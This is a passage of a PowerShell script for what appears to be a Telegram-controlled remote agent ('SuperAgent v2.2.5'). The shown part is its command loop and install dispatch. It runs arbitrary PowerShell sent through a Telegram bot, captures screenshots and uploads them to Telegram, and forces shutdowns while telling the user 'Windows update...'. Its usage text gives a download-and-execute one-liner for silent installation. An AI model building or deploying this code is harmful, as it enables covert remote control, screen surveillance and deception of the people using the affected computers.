                    $restText = ($restArgs -join ' ').Trim()

                    switch ($cmd) {
                        '/shutdown' {
                            Send-Telegram "[$PCName] Shutting down..."
                            shutdown /s /t 3 /f /c 'Windows update...'
                        }
                        '/restart' {
                            Send-Telegram "[$PCName] Restarting..."
                            shutdown /r /t 3 /f /c 'Windows update...'
                        }
                        '/lock' {
                            if (Invoke-Lock) { Send-Telegram "[$PCName] Screen locked" }
                            else             { Send-Telegram "[$PCName] Lock failed (see /log)" }
                        }
                        '/status' { Send-Telegram (Get-PCInfo) }
                        '/screenshot' {
                            $file = Invoke-Screenshot
                            if ($file) {
                                Send-TelegramPhoto -FilePath $file -Caption "[$PCName] $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
                                Remove-Item $file -Force -EA SilentlyContinue
                            } else {
                                Send-Telegram "[$PCName] Screenshot failed - check /log"
                            }
                        }
                        '/msg' {
                            if (-not $pcname) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>`nOr /msgall <text>"
                            } elseif (-not $restText) {
                                Send-Telegram "[$PCName] Usage: /msg @pc <text>"
                            } else {
                                if (Invoke-Msg -Text $restText) { Send-Telegram "[$PCName] Displayed: $restText" }
                                else { Send-Telegram "[$PCName] Display FAILED - check /log" }
                            }
                        }
                        '/msgall' {
                            $allArgs = $parts[1..($parts.Length - 1)]
                            if ($allArgs -and $allArgs[0].StartsWith('@')) {
                                $allArgs = $allArgs[1..($allArgs.Length - 1)]
                            }
                            $msgText = ($allArgs -join ' ').Trim()
                            if ($msgText) {
                                if (Invoke-Msg -Text $msgText) { Send-Telegram "[$PCName] Displayed (broadcast): $msgText" }
                                else { Send-Telegram "[$PCName] Display FAILED - check /log" }
                            } else {
                                Send-Telegram "[$PCName] Usage: /msgall <text>"
                            }
                        }
                        '/exec' {
                            if ($restText) {
                                $result = Invoke-Exec -Command $restText
                                Send-Telegram "[$PCName] > $restText`:`n$result"
                            } else {
                                Send-Telegram "[$PCName] Usage: /exec @pc <PowerShell command>"
                            }
                        }
                        '/update' { Invoke-Update }
                        '/uninstall' {
                            if (Test-UninstallConfirmation) {
                                $script:UninstallPendingAt = $null
                                Send-Telegram "[$PCName] Uninstall CONFIRMED. Removing in 3s..."
                                Invoke-SelfUninstall
                                exit 0
                            } else {
                                $script:UninstallPendingAt = Get-Date
                                Send-Telegram "[$PCName] Uninstall requested. Send /uninstall again within 10s to CONFIRM."
                            }
                        }
                        '/log' {
                            if (Test-Path $LogPath) {
                                $lines = Get-Content $LogPath -Tail 50
                                $ltext = ($lines -join "`n")
                                if ($ltext.Length -gt 3900) { $ltext = $ltext.Substring($ltext.Length - 3900) }
                                $body = @{ chat_id = $ChatId; text = "[$PCName] Last 50 log lines:`n`n$ltext" }
                                try {
                                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                                        -Method Post -Body $body -TimeoutSec 15 | Out-Null
                                } catch {
                                    Write-Log "sendMessage (log) FAIL: $($_.Exception.Message)"
                                }
                            } else {
                                Send-Telegram "[$PCName] No log file yet"
                            }
                        }
                        '/help' {
                            Send-Telegram @"
[$PCName] *Commands:*
/shutdown [pc]      - Power off
/restart  [pc]      - Restart
/lock     [pc]      - Lock screen
/status   [pc]      - PC info
/screenshot [pc]    - Capture screen
/msg   @pc <text>   - Popup ONE PC (needs @)
/msgall <text>      - Popup ALL PCs
/exec  @pc <cmd>    - Run PowerShell
/update  [pc]       - Self-update
/uninstall [pc]     - Remove (2x confirm in 10s)
/log     [pc]       - Last 50 log lines
/help               - This help
"@
                        }
                        default { }
                    }
                }
            }
        }
        catch {
            Write-Log "POLL ERROR: $($_.Exception.Message)"
            Start-Sleep -Seconds 5
        }
    }
}

# =====================================================================
# DISPATCH
# =====================================================================
function Pause-Exit {
    param([string]$Msg = 'Press Enter to exit...')
    Write-Host ''
    try { Read-Host $Msg | Out-Null } catch { }
}

if ($Install) {
    try { & $InstallBlock; exit 0 }
    catch {
        Write-Msg ''
        Write-Msg ' INSTALL ERROR:' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        if (-not $Silent) { Pause-Exit }
        exit 1
    }
}

if ($Uninstall) {
    try { & $UninstallBlock; exit 0 }
    catch {
        Write-Msg ''
        Write-Msg ' UNINSTALL ERROR:' -Color Red
        Write-Msg $_.Exception.Message -Color Yellow
        if (-not $Silent) { Pause-Exit }
        exit 1
    }
}

if ($Run) {
    try { & $AgentBlock }
    catch { Start-Sleep -Seconds 10; exit 1 }
    exit 0
}

if (-not $Silent) {
    Write-Msg ''
    Write-Msg '=== SuperAgent v2.2.5 - Usage ===' -Color Cyan
    Write-Msg ''
    Write-Msg 'Install (silent):'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Install -Silent -BotToken '123:ABC' -ChatId '123456' -PCName 'PC-Office'"
    Write-Msg ''
    Write-Msg 'Uninstall:'
    Write-Msg "  & ([scriptblock]::Create((irm '$RepoUrl/pcagent.ps1'))) -Uninstall -Silent"
    Write-Msg ''
}
exit 0
